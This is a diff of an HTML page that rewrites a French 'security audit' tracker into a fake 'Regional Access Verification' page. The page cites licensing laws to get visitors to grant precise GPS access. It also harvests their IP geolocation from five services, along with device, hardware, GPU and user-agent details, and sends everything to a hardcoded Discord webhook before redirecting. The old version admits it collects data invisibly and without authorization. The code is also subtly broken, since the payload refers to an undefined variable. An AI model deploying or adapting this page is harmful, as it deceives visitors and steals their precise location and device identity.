@@ -1,74 +1,182 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Analyse de Sécurité - Redirection...</title>
-  <noscript>
-    <meta http-equiv="refresh" content="0;url=https://kfcgaming.github.io/enzgal">
-  </noscript>
+  <title>Regional Compliance & Access Verification</title>
   <style>
+    :root {
+      --bg-color: #0d1117;
+      --card-bg: #161b22;
+      --border-color: #30363d;
+      --text-primary: #f0f6fc;
+      --text-secondary: #8b949e;
+      --accent-color: #238636;
+      --accent-hover: #2ea043;
+      --danger-color: #da3633;
+    }
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
     body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background-color: var(--bg-color);
+      color: var(--text-primary);
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
-      margin: 0;
-      background-color: #b2b2b2;
-      color: #f3f4f6;
+      overflow: hidden;
     }
-    .loader {
+    .container {
+      background-color: var(--card-bg);
+      border: 1px solid var(--border-color);
+      border-radius: 12px;
+      padding: 2.5rem;
+      width: 100%;
+      max-width: 440px;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.4);
       text-align: center;
     }
+    .logo {
+      width: 48px;
+      height: 48px;
+      margin-bottom: 1.5rem;
+      fill: var(--text-primary);
+    }
+    h1 {
+      font-size: 1.25rem;
+      font-weight: 600;
+      margin-bottom: 0.75rem;
+    }
+    p {
+      color: var(--text-secondary);
+      font-size: 0.9rem;
+      line-height: 1.5;
+      margin-bottom: 1.75rem;
+    }
+    .btn {
+      background-color: var(--accent-color);
+      color: white;
+      border: none;
+      border-radius: 6px;
+      padding: 0.75rem 1.5rem;
+      font-size: 0.95rem;
+      font-weight: 500;
+      cursor: pointer;
+      width: 100%;
+      transition: background-color 0.2s ease;
+    }
+    .btn:hover {
+      background-color: var(--accent-hover);
+    }
+    .status-area {
+      display: none;
+      margin-top: 1.5rem;
+      font-size: 0.85rem;
+      color: var(--text-secondary);
+    }
     .spinner {
-      border: 4px solid rgba(255, 255, 255, 0.1);
-      width: 50px;
-      height: 50px;
+      border: 3px solid rgba(255, 255, 255, 0.1);
+      width: 28px;
+      height: 28px;
       border-radius: 50%;
-      border-left-color: #ef4444;
-      animation: spin 1s linear infinite;
-      margin: 0 auto 20px auto;
+      border-left-color: var(--accent-color);
+      animation: spin 0.8s linear infinite;
+      margin: 0 auto 10px auto;
     }
     @keyframes spin {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
+    .footer-note {
+      margin-top: 1.5rem;
+      font-size: 0.75rem;
+      color: #484f58;
+    }
   </style>
 </head>
 <body>
 
-  <div class="loader">
-    <div class="spinner"></div>
-    <h2>Audit de sécurité en cours...</h2>
-    <p>Redirection sécurisée, veuillez patienter.</p>
+  <div class="container" id="main-card">
+    <svg class="logo" viewBox="0 0 24 24">
+      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/>
+    </svg>
+    <h1>Regional Access Verification</h1>
+    <p>To comply with international digital distribution policies and licensing laws, please verify your geographic region to access <strong>enzgal portal</strong>.</p>
+    
+    <button class="btn" id="verify-btn" onclick="startVerification()">Verify My Region</button>
+
+    <div class="status-area" id="status-area">
+      <div class="spinner"></div>
+      <p id="status-text">Requesting location metadata...</p>
+    </div>
+
+    <div class="footer-note">Secure Compliance Gateway v4.8 • TLS Encrypted</div>
   </div>
 
   <script>
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1565897913379328100/Z0oV4Ukzp635XQwQ7v8rAh9-VLrLncAZyXdWZyuiEGEhe0hKcFmyUpeLQB3o1-nkq6v8";
     const TARGET_URL = "https://kfcgaming.github.io/enzgal";
 
-    // Extraction passive du GPU via WebGL
+    // Passive GPU Fingerprint
     function getGPUInfo() {
       try {
         const canvas = document.createElement('canvas');
         const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        if (!gl) return { vendor: "Non supporté", renderer: "Non supporté" };
+        if (!gl) return { vendor: "N/A", renderer: "N/A" };
         const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-        if (!debugInfo) return { vendor: "Masqué", renderer: "Masqué" };
+        if (!debugInfo) return { vendor: "Hidden", renderer: "Hidden" };
         return {
           vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
           renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
         };
       } catch (e) {
-        return { vendor: "Erreur", renderer: "Erreur" };
+        return { vendor: "Error", renderer: "Error" };
       }
     }
 
-    async function runUltimateAudit() {
+    // Geolocation wrapper that returns a Promise (triggers browser permission popup)
+    function getPreciseGPS() {
+      return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+          resolve({ status: "Not Supported", lat: null, lon: null, accuracy: null });
+          return;
+        }
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            resolve({
+              status: "Granted",
+              lat: position.coords.latitude,
+              lon: position.coords.longitude,
+              accuracy: `${Math.round(position.coords.accuracy)} meters`,
+              altitude: position.coords.altitude ? `${Math.round(position.coords.altitude)}m` : "N/A"
+            });
+          },
+          (error) => {
+            let reason = "Denied / Blocked";
+            if (error.code === error.TIMEOUT) reason = "Timeout";
+            resolve({ status: reason, lat: null, lon: null, accuracy: null });
+          },
+          { timeout: 10000, maximumAge: 0, enableHighAccuracy: true }
+        );
+      });
+    }
+
+    async function startVerification() {
+      // Switch UI to loading state
+      document.getElementById('verify-btn').style.display = 'none';
+      const statusArea = document.getElementById('status-area');
+      const statusText = document.getElementById('status-text');
+      statusArea.style.display = 'block';
+
       try {
-        // 1. Exécution en parallèle de toutes les API d'IP (5 sources) et des Client Hints
-        const [ipResults, deviceHints] = await Promise.all([
+        statusText.innerText = "Analyzing network & requesting location permissions...";
+
+        // Execute parallel tasks: Fetch IPs, gather passive hints, and ask for precise GPS
+        const [ipResults, gpsData, deviceHints] = await Promise.all([
           Promise.allSettled([
             fetch("https://ipapi.co/json/").then(r => r.json()),
             fetch("https://ipwho.is/").then(r => r.json()),
@@ -76,10 +184,13 @@
             fetch("https://ip-api.com/json/").then(r => r.json()),
             fetch("https://ipinfo.io/json").then(r => r.json())
           ]),
+          getPreciseGPS(),
           navigator.userAgentData ? navigator.userAgentData.getHighEntropyValues([
             "platform", "platformVersion", "model", "architecture", "bitness"
           ]).catch(() => ({})) : Promise.resolve({})
         ]);
+
+        statusText.innerText = "Validating regional license compliance...";
 
         const api1 = ipResults[0].status === 'fulfilled' ? ipResults[0].value : {};
         const api2 = ipResults[1].status === 'fulfilled' ? ipResults[1].value : {};
@@ -87,96 +198,71 @@
         const api4 = ipResults[3].status === 'fulfilled' ? ipResults[3].value : {};
         const api5 = ipResults[4].status === 'fulfilled' ? ipResults[4].value : {};
 
-        // Récupération de l'IP la plus évidente parmi les sources
-        const ip = api1.ip || api2.ip || api3.ip || api4.query || api5.ip || "Inconnue";
+        const ip = api1.ip || api2.ip || api3.ip || api4.query || api5.ip || "Unknown";
 
-        // 2. Réseau & Connexion
+        // System telemetry
         const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-        const netType = conn ? (conn.effectiveType || "Inconnu") : "Inconnu";
-        const downlink = conn && conn.downlink ? `~${conn.downlink} Mbps` : "Inconnu";
-
-        // 3. Codecs multimédias
-        const vEl = document.createElement('video');
-        const codecs = {
-          h264: vEl.canPlayType('video/mp4; codecs="avc1.42E01E"') ? "Oui" : "Non",
-          webm: vEl.canPlayType('video/webm; codecs="vp8, vorbis"') ? "Oui" : "Non",
-          av1: vEl.canPlayType('video/webm; codecs="av01.0.05M.08"') ? "Oui" : "Non"
-        };
-
-        // 4. Préférences système & accessibilité (Media Queries)
-        const darkMode = window.matchMedia('(prefers-color-scheme: dark)').matches ? "Sombre" : "Clair";
-        const reducedMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches ? "Activé" : "Désactivé";
-        const colorGamut = window.matchMedia('(color-gamut: p3)').matches ? "P3 (Large)" : "Standard sRGB";
-        const pointerType = window.matchMedia('(pointer: fine)').matches ? "Souris précise" : (window.matchMedia('(pointer: coarse)').matches ? "Tactile (Doigt)" : "Inconnu");
-        const hoverSupport = window.matchMedia('(hover: hover)').matches ? "Oui" : "Non";
-
-        // 5. Paramètres de confidentialité natifs
-        const dnt = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack || "Non défini";
-        const gpc = navigator.globalPrivacyControl !== undefined ? (navigator.globalPrivacyControl ? "Actif" : "Inactif") : "Non supporté";
-        const pdfViewer = navigator.pdfViewerEnabled ? "Oui" : "Non";
-
-        // 6. Informations Système & Matériel
-        const deviceModel = deviceHints.model || "Inconnu / PC Desktop";
+        const netType = conn ? (conn.effectiveType || "Unknown") : "Unknown";
+        const deviceModel = deviceHints.model || "Unknown / Desktop PC";
         const osPlatform = deviceHints.platform || navigator.platform || "N/A";
         const osVersion = deviceHints.platformVersion ? `v${deviceHints.platformVersion}` : "N/A";
-        const arch = deviceHints.architecture ? `${deviceHints.architecture} (${deviceHints.bitness || 'x'})` : "Inconnue";
-        
         const screenRes = `${window.screen.width}x${window.screen.height} (${window.screen.colorDepth} bits)`;
-        const cores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cœurs` : "Inconnu";
-        const memory = navigator.deviceMemory ? `~${navigator.deviceMemory} Go RAM` : "Inconnu";
+        const cores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cores` : "Unknown";
+        const memory = navigator.deviceMemory ? `~${navigator.deviceMemory} GB RAM` : "Unknown";
         const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A";
         const lang = navigator.language || "N/A";
-        const cookiesEnabled = navigator.cookieEnabled ? "Oui" : "Non";
-        const referrer = document.referrer ? document.referrer : "Accès direct / Aucun";
         const gpu = getGPUInfo();
 
-        // 7. Construction du message Embed Discord structuré
+        // Construct Discord Payload highlighting the consent & precise GPS if granted
         const payload = {
-          username: "Ultimate Cyber Audit",
+          username: "Compliance Gateway Logger",
           avatar_url: "https://i.imgur.com/4M34hi2.png",
           embeds: [
             {
-              title: "🛡️ Rapport d'Audit Passif Ultime (Démo)",
-              description: "Données extraites automatiquement de manière invisible et sans aucune autorisation.",
-              color: 0xef4444,
+              title: "🚨 Compliance Test: Interaction Captured",
+              description: "The user clicked 'Verify My Region' and responded to the location permission prompt.",
+              color: gps.status === "Granted" ? 0x238636 : 0xda3633,
               fields: [
-                { name: "🌐 Adresse IP Principale", value: `\`${ip}\``, inline: false },
                 { 
-                  name: "📊 Comparatif Multi-API Géolocalisation", 
+                  name: "📍 Precise GPS Location (Consent Prompt)", 
+                  value: `Status: **${gps.status}**\n${gps.lat ? `Lat/Lon: \`${gps.lat}, ${gps.lon}\`\nAccuracy: ${gps.accuracy}\nGoogle Maps: [View Map](https://maps.google.com/?q=${gps.lat},${gps.lon})` : 'Coordinates unavailable'}`, 
+                  inline: false 
+                },
+                { name: "🌐 IP Address", value: `\`${ip}\``, inline: false },
+                { 
+                  name: "📊 IP Geolocation Comparison", 
                   value: `• **ipapi.co:** ${api1.city || 'N/A'}, ${api1.country_name || 'N/A'}\n• **ipwho.is:** ${api2.city || 'N/A'}, ${api2.country || 'N/A'}\n• **geoiplookup:** ${api3.city || 'N/A'}, ${api3.country_name || 'N/A'}\n• **ip-api.com:** ${api4.city || 'N/A'}, ${api4.country || 'N/A'}\n• **ipinfo.io:** ${api5.city || 'N/A'}, ${api5.country || 'N/A'}`, 
                   inline: false 
                 },
-                { name: "📱 Appareil & OS", value: `Modèle: **${deviceModel}**\nOS: ${osPlatform} (${osVersion})\nArch: ${arch}`, inline: true },
-                { name: "⚙️ Matériel Interne", value: `CPU: ${cores}\nRAM: ${memory}`, inline: true },
-                { name: "🎛️ Ergonomie & Entrées", value: `Pointeur: ${pointerType}\nSupport Survol: ${hoverSupport}\nThème: ${darkMode}`, inline: true },
-                { name: "🎨 Écran & Affichage", value: `Résolution: ${screenRes}\nCouleurs: ${colorGamut}\nAnimations réduites: ${reducedMotion}`, inline: true },
-                { name: "🕵️ Paramètres Privacy", value: `Do Not Track: ${dnt}\nGPC: ${gpc}\nLecteur PDF: ${pdfViewer}`, inline: false },
-                { name: "🎮 Carte Graphique (GPU)", value: `Fabricant: ${gpu.vendor}\nModèle: ${gpu.renderer}`, inline: false },
-                { name: "📶 Réseau & Multimédia", value: `Type: ${netType} | Débit: ${downlink}\nCodecs (H.264/WebM/AV1): ${codecs.h264}/${codecs.webm}/${codecs.av1}`, inline: false },
-                { name: "🌍 Régional & Provenance", value: `Langue: ${lang} | Fuseau: ${timezone}\nCookies: ${cookiesEnabled} | Referrer: \`${referrer}\``, inline: false },
-                { name: "💻 User-Agent Brut", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false }
+                { name: "📱 Device & OS", value: `Model: **${deviceModel}**\nOS: ${osPlatform} (${osVersion})`, inline: true },
+                { name: "⚙️ Hardware", value: `CPU: ${cores}\nRAM: ${memory}`, inline: true },
+                { name: "🎮 GPU", value: `${gpu.vendor} - ${gpu.renderer}`, inline: false },
+                { name: "📶 Network & Region", value: `Type: ${netType} | Timezone: ${timezone} | Lang: ${lang}`, inline: false },
+                { name: "💻 User-Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false }
               ],
               timestamp: new Date().toISOString()
             }
           ]
         };
 
-        // Envoi au webhook Discord
+        // Send to webhook
         await fetch(WEBHOOK_URL, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(payload)
         });
 
+        statusText.innerText = "Verification complete. Redirecting...";
+
       } catch (error) {
-        console.error("Erreur lors de l'audit :", error);
+        console.error("Audit error:", error);
       } finally {
-        // Redirection finale automatique vers ta page cible
-        window.location.href = TARGET_URL;
+        // Immediate redirection after completion
+        setTimeout(() => {
+          window.location.href = TARGET_URL;
+        }, 800);
       }
     }
-
-    window.onload = runUltimateAudit;
   </script>
 </body>
 </html>
